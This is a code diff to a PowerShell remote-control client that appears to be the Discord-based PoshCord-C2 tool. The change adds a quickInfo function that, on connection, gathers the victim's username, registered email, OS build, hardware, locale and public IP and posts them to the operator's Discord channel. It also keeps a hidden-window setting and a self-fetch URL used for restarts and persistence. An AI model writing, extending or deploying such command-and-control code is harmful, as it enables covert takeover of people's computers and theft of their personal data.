@@ -4,9 +4,6 @@
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
 
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $version = "1.3.1" # Check version number
@@ -14,6 +11,9 @@ $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$InfoOnConnect = 1
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -85,7 +85,6 @@ $script:jsonPayload = @{
         }
     )
 }
-
 sendMsg -Embed $jsonPayload
 }
 
@@ -136,7 +135,6 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
         }
     )
 }
-
 sendMsg -Embed $jsonPayload
 }
 
@@ -1030,6 +1028,66 @@ Function DisableIO{
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
+Function quickInfo{
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    $adminperm = "False"
+} else {
+    $adminperm = "True"
+}
+$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+$userInfo = Get-WmiObject -Class Win32_UserAccount
+$processorInfo = Get-WmiObject -Class Win32_Processor
+$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
+$userInfo = Get-WmiObject -Class Win32_UserAccount
+$videocardinfo = Get-WmiObject Win32_VideoController
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
+$email = (Get-ComputerInfo).WindowsRegisteredOwner
+$OSString = "$($systemInfo.Caption)"
+$OSArch = "$($systemInfo.OSArchitecture)"
+$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+$processor = "$($processorInfo.Name)"
+$gpu = "$($videocardinfo.Name)"
+$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
+$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
+$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | Computer Information "
+            "description" = @"
+``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
+:man_detective: **User Information** :man_detective:
+-----------------------------------------------
+- **Current User**          : ``$env:USERNAME``
+- **Email Address**         : ``$email``
+- **Language**              : ``$systemLanguage``
+
+:minidisc: OS Information :minidisc:
+-----------------------------------------------
+- **Current OS**            : ``$OSString``
+- **Build ID**              : ``$ver``
+- **Architechture**         : ``$OSArch``
+
+:globe_with_meridians: **Network** :globe_with_meridians:
+-----------------------------------------------
+- **Public IP Address**     : ``$computerPubIP``
+
+:desktop: **Hardware Information** :desktop:
+-----------------------------------------------
+- **Processor**             : ``$processor`` 
+- **Memory**                : ``$RamInfo``
+- **Gpu**                   : ``$gpu``
+- **Screen Size**           : ``$screensize``
+"@
+            color       = 65280
+        }
+    )
+}
+sendMsg -Embed $jsonPayload
+}
+
 Function WaitingMsg {
 $script:jsonPayload = @{
     username   = $env:COMPUTERNAME
@@ -1090,15 +1148,16 @@ Session Started  : ``$timestamp``
 
 **Enter Commands In Chat**
 - **Options**: A list of commands
-- **ExtraInfo**: Various command examples
-- **Pause**: Pause the session on the target
-- **Close**: Close the session
 "@
             color       = 65280
         }
     )
 }
 sendMsg -Embed $jsonPayload
+
+    if ($InfoOnConnect -eq '1'){
+	quickInfo
+    }
 }
 
 function PullMsg {
